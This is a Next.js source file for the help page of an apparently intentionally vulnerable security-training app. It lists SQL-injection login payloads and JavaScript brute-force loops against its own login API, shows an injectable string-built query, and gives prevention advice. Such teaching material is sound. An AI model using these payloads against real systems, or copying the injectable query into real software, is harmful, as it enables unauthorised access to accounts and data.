"use client"

import { useState } from "react"
import { motion } from "framer-motion"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Shield, ArrowLeft, Code, Terminal, AlertTriangle, BookOpen, Copy, Check } from "lucide-react"
import Link from "next/link"
import { fadeInUp, staggerContainer } from "@/lib/animations"

export default function HelpPage() {
  const [copiedCode, setCopiedCode] = useState<string | null>(null)

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text)
    setCopiedCode(id)
    setTimeout(() => setCopiedCode(null), 2000)
  }

  const sqlInjectionExamples = [
    {
      id: "basic-bypass",
      title: "Basic Authentication Bypass",
      description: "Bypass login by making the SQL query always return true",
      username: "admin' OR '1'='1",
      password: "anything",
      explanation:
        "This works because the SQL query becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'. The OR '1'='1' makes the condition always true.",
      severity: "high",
    },
    {
      id: "comment-bypass",
      title: "Comment-Based Bypass",
      description: "Use SQL comments to ignore the password check",
      username: "admin'--",
      password: "",
      explanation:
        "The -- comments out the rest of the query, so it becomes: SELECT * FROM users WHERE username = 'admin'-- AND password = ''. Everything after -- is ignored.",
      severity: "high",
    },
    {
      id: "always-true",
      title: "Always True Condition",
      description: "Create a condition that's always true",
      username: "' OR 1=1--",
      password: "anything",
      explanation:
        "This makes the query: SELECT * FROM users WHERE username = '' OR 1=1-- AND password = 'anything'. Since 1=1 is always true, it returns all users.",
      severity: "critical",
    },
    {
      id: "union-attack",
      title: "UNION-Based Injection",
      description: "Combine results from multiple queries",
      username: "admin' UNION SELECT 1,'admin','password','admin@test.com','admin','active'--",
      password: "anything",
      explanation:
        "UNION allows combining results from multiple SELECT statements. This can be used to extract data from other tables or inject fake data.",
      severity: "critical",
    },
  ]

  const bruteForceExamples = [
    {
      id: "simple-brute",
      title: "Simple Brute Force",
      description: "Try common passwords sequentially",
      code: `// Simple brute force example
const passwords = ['password', '123456', 'admin123', 'qwerty'];
for (const pwd of passwords) {
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'admin', password: pwd })
  });
  const data = await response.json();
  if (data.success) {
    console.log('Found password:', pwd);
    break;
  }
}`,
      language: "javascript",
    },
    {
      id: "parallel-brute",
      title: "Parallel Brute Force",
      description: "Test multiple passwords simultaneously",
      code: `// Parallel brute force with Promise.all
const passwords = ['password', '123456', 'admin123', 'qwerty'];
const attempts = passwords.map(pwd => 
  fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'admin', password: pwd })
  }).then(r => r.json())
);
const results = await Promise.all(attempts);
const success = results.find(r => r.success);
if (success) console.log('Password found!');`,
      language: "javascript",
    },
  ]

  return (
    <div className="min-h-screen bg-background relative overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-br from-primary/5 via-background to-secondary/5" />

      <motion.header
        className="border-b border-border relative z-10 backdrop-blur-sm bg-background/80"
        initial={{ y: -20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ duration: 0.5 }}
      >
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <Link href="/">
                <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                  <Button variant="ghost" size="sm">
                    <ArrowLeft className="w-4 h-4 mr-2" />
                    Back to Login
                  </Button>
                </motion.div>
              </Link>
              <motion.div className="flex items-center gap-2" whileHover={{ scale: 1.05 }}>
                <BookOpen className="w-6 h-6 text-primary" />
                <span className="font-mono text-lg font-semibold">Documentation</span>
              </motion.div>
            </div>
            <Link href="/admin">
              <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                <Button variant="outline" size="sm">
                  <Terminal className="w-4 h-4 mr-2" />
                  Admin Dashboard
                </Button>
              </motion.div>
            </Link>
          </div>
        </div>
      </motion.header>

      <main className="container mx-auto px-4 py-8 relative z-10">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="mb-8"
        >
          <h1 className="text-4xl font-bold mb-4">Security Training Guide</h1>
          <p className="text-muted-foreground text-lg leading-relaxed">
            Learn about common web vulnerabilities and how to exploit them in this safe training environment.
          </p>
        </motion.div>

        <Tabs defaultValue="sql-injection" className="space-y-6">
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="sql-injection">SQL Injection</TabsTrigger>
            <TabsTrigger value="brute-force">Brute Force</TabsTrigger>
            <TabsTrigger value="prevention">Prevention</TabsTrigger>
          </TabsList>

          <TabsContent value="sql-injection" className="space-y-6">
            <motion.div variants={staggerContainer} initial="initial" animate="animate">
              <Card className="backdrop-blur-sm bg-card/50 mb-6">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Code className="w-5 h-5" />
                    What is SQL Injection?
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <p className="text-muted-foreground leading-relaxed">
                    SQL Injection is a code injection technique that exploits vulnerabilities in an application's
                    database layer. Attackers can insert malicious SQL statements into input fields, which are then
                    executed by the database.
                  </p>
                  <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4">
                    <p className="text-sm font-medium text-destructive mb-2">Vulnerable Code Example:</p>
                    <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
                      {`const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\``}
                    </pre>
                  </div>
                </CardContent>
              </Card>

              {sqlInjectionExamples.map((example, index) => (
                <motion.div key={example.id} variants={fadeInUp} transition={{ delay: index * 0.1 }}>
                  <Card className="backdrop-blur-sm bg-card/50 hover:shadow-lg transition-shadow duration-300">
                    <CardHeader>
                      <div className="flex items-start justify-between">
                        <div>
                          <CardTitle className="text-lg">{example.title}</CardTitle>
                          <CardDescription>{example.description}</CardDescription>
                        </div>
                        <Badge variant={example.severity === "critical" ? "destructive" : "secondary"}>
                          {example.severity}
                        </Badge>
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="grid md:grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <div className="flex items-center justify-between">
                            <label className="text-sm font-medium">Username</label>
                            <Button
                              size="sm"
                              variant="ghost"
                              onClick={() => copyToClipboard(example.username, `${example.id}-user`)}
                            >
                              {copiedCode === `${example.id}-user` ? (
                                <Check className="w-3 h-3" />
                              ) : (
                                <Copy className="w-3 h-3" />
                              )}
                            </Button>
                          </div>
                          <div className="bg-secondary/50 p-3 rounded font-mono text-sm">{example.username}</div>
                        </div>
                        <div className="space-y-2">
                          <div className="flex items-center justify-between">
                            <label className="text-sm font-medium">Password</label>
                            <Button
                              size="sm"
                              variant="ghost"
                              onClick={() => copyToClipboard(example.password, `${example.id}-pass`)}
                            >
                              {copiedCode === `${example.id}-pass` ? (
                                <Check className="w-3 h-3" />
                              ) : (
                                <Copy className="w-3 h-3" />
                              )}
                            </Button>
                          </div>
                          <div className="bg-secondary/50 p-3 rounded font-mono text-sm">
                            {example.password || "(empty)"}
                          </div>
                        </div>
                      </div>
                      <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                        <p className="text-sm font-medium mb-2">How it works:</p>
                        <p className="text-sm text-muted-foreground">{example.explanation}</p>
                      </div>
                    </CardContent>
                  </Card>
                </motion.div>
              ))}
            </motion.div>
          </TabsContent>

          <TabsContent value="brute-force" className="space-y-6">
            <Card className="backdrop-blur-sm bg-card/50 mb-6">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Terminal className="w-5 h-5" />
                  What is Brute Force?
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <p className="text-muted-foreground leading-relaxed">
                  Brute force is a trial-and-error method used to obtain information such as passwords or encryption
                  keys. Attackers systematically try all possible combinations until the correct one is found.
                </p>
                <div className="bg-warning/10 border border-warning/20 rounded-lg p-4">
                  <p className="text-sm font-medium text-warning mb-2">Why This App is Vulnerable:</p>
                  <ul className="text-sm text-muted-foreground space-y-1 list-disc list-inside">
                    <li>No rate limiting on login attempts</li>
                    <li>No account lockout after failed attempts</li>
                    <li>No CAPTCHA or challenge-response</li>
                    <li>No delay between attempts</li>
                  </ul>
                </div>
              </CardContent>
            </Card>

            {bruteForceExamples.map((example, index) => (
              <motion.div
                key={example.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: index * 0.1 }}
              >
                <Card className="backdrop-blur-sm bg-card/50 hover:shadow-lg transition-shadow duration-300">
                  <CardHeader>
                    <div className="flex items-start justify-between">
                      <div>
                        <CardTitle className="text-lg">{example.title}</CardTitle>
                        <CardDescription>{example.description}</CardDescription>
                      </div>
                      <Button size="sm" variant="ghost" onClick={() => copyToClipboard(example.code, example.id)}>
                        {copiedCode === example.id ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      </Button>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <pre className="text-xs font-mono bg-background/50 p-4 rounded overflow-x-auto">{example.code}</pre>
                  </CardContent>
                </Card>
              </motion.div>
            ))}
          </TabsContent>

          <TabsContent value="prevention" className="space-y-6">
            <Card className="backdrop-blur-sm bg-card/50">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Shield className="w-5 h-5 text-primary" />
                  Security Best Practices
                </CardTitle>
                <CardDescription>How to protect your applications from these vulnerabilities</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div>
                  <h3 className="text-lg font-semibold mb-3">Preventing SQL Injection</h3>
                  <div className="space-y-4">
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">1. Use Parameterized Queries</p>
                      <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
                        {`// Secure approach
const stmt = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?')
const user = stmt.get(username, password)`}
                      </pre>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">2. Input Validation</p>
                      <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
                        {`// Validate and sanitize input
const sanitizedUsername = username.replace(/[^a-zA-Z0-9]/g, '')
if (sanitizedUsername.length < 3 || sanitizedUsername.length > 20) {
  throw new Error('Invalid username')
}`}
                      </pre>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">3. Use ORM Libraries</p>
                      <p className="text-sm text-muted-foreground">
                        Use Object-Relational Mapping (ORM) libraries like Prisma, TypeORM, or Sequelize that handle SQL
                        escaping automatically.
                      </p>
                    </div>
                  </div>
                </div>

                <div>
                  <h3 className="text-lg font-semibold mb-3">Preventing Brute Force</h3>
                  <div className="space-y-4">
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">1. Rate Limiting</p>
                      <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
                        {`// Limit login attempts per IP
const rateLimit = new Map()
const MAX_ATTEMPTS = 5
const WINDOW = 15 * 60 * 1000 // 15 minutes

if (rateLimit.get(ip) >= MAX_ATTEMPTS) {
  throw new Error('Too many attempts')
}`}
                      </pre>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">2. Account Lockout</p>
                      <p className="text-sm text-muted-foreground">
                        Lock accounts after a certain number of failed attempts. Require email verification or admin
                        intervention to unlock.
                      </p>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">3. CAPTCHA</p>
                      <p className="text-sm text-muted-foreground">
                        Implement CAPTCHA (like reCAPTCHA) after failed login attempts to prevent automated attacks.
                      </p>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">4. Multi-Factor Authentication</p>
                      <p className="text-sm text-muted-foreground">
                        Add an additional layer of security with 2FA/MFA using authenticator apps or SMS codes.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="bg-warning/10 border border-warning/20 rounded-lg p-4">
                  <div className="flex items-start gap-3">
                    <AlertTriangle className="w-5 h-5 text-warning mt-0.5" />
                    <div>
                      <p className="font-medium text-warning mb-2">Important Reminder</p>
                      <p className="text-sm text-muted-foreground">
                        This application intentionally lacks these security measures for educational purposes. Never
                        deploy applications without proper security controls to production environments.
                      </p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </main>
    </div>
  )
}
